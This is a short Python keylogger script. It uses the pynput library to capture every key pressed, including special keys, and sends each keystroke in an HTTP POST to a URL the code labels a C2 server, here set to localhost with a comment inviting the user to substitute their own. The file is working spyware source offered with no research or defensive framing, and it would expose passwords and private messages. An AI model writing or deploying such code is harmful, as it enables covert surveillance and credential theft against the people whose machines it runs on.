import time
import requests
import os
from pynput.keyboard import Key, Listener

# Set your C2 server URL
c2_server_url = 'http://localhost:5000/log_data'

def send_keystroke(data):
    try:
        response = requests.post(c2_server_url, json={"log": data})
        if response.status_code == 200:
            print("Keystroke sent successfully.")
        else:
            print("Failed to send keystroke.")
    except Exception as e:
        print(f"Error sending keystroke: {e}")

def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        if key == Key.space:
            key_str = " "
        elif key == Key.enter:
            key_str = "\n"
        elif key == Key.tab:
            key_str = "\t"
        elif key == Key.backspace:
            key_str = "[BACKSPACE]"
        elif key == Key.shift:
            key_str = "[SHIFT]"
        elif key == Key.alt_l or key == Key.alt_gr:
            key_str = "[ALT]"
        elif key == Key.esc:
            key_str = "[ESC]"
        else:
            key_str = f"[{key}]"

    # Send keystroke to the C2 server
    send_keystroke(key_str)

def on_release(key):
    if key == Key.esc:
        return False

# Main loop
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

